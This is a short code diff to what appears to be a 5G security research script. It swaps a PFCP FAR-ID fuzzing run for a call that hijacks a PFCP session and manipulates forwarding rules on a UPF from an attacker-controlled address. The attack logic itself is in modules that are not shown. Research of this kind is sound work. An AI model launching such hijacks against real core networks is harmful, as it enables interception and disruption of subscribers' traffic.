@@ -4,6 +4,7 @@ from pfcpToolkit import PFCPToolkit
 import random
 from pfcpToolkit import PFCPToolkit
 from pfcpFuzzer import PFCPFuzzer
+from pfcpHijack import PFCPHijack
 teid_counter = 1
 randomize_teid = False
 teid = None
@@ -222,14 +223,24 @@ NET_IFACE= "eth0"
 
 # print(ma_liste)
 
-PFCPFuzzer_obj = PFCPFuzzer()
-PFCPFuzzer_obj.set_verbose(True)
-PFCPFuzzer_obj.Start_PFCP_FARID_fuzzing(
-    upf_addr=UPF_ADDR,
-    src_addr=EVIL_ADDR,
-    max_seid=10,
-    max_far_discover=100,
-    src_port=SRC_PORT,
-    dest_port=DEST_PORT
-)
+# PFCPFuzzer_obj = PFCPFuzzer()
+# PFCPFuzzer_obj.set_verbose(True)
+# PFCPFuzzer_obj.Start_PFCP_FARID_fuzzing(
+#     upf_addr=UPF_ADDR,
+#     src_addr=EVIL_ADDR,
+#     max_seid=10,
+#     max_far_discover=100,
+#     src_port=SRC_PORT,
+#     dest_port=DEST_PORT
+# )
 
+
+PFCPHijack_obj = PFCPHijack()
+PFCPHijack_obj.set_verbose(True)
+PFCPHijack_obj.Start_PFCP_hijack_far_manipulation(
+    hijacker_addr=EVIL_ADDR,
+    upf_addr=UPF_ADDR,
+    src_port=SRC_PORT,
+    dest_port=DEST_PORT,
+    seid=1
+)
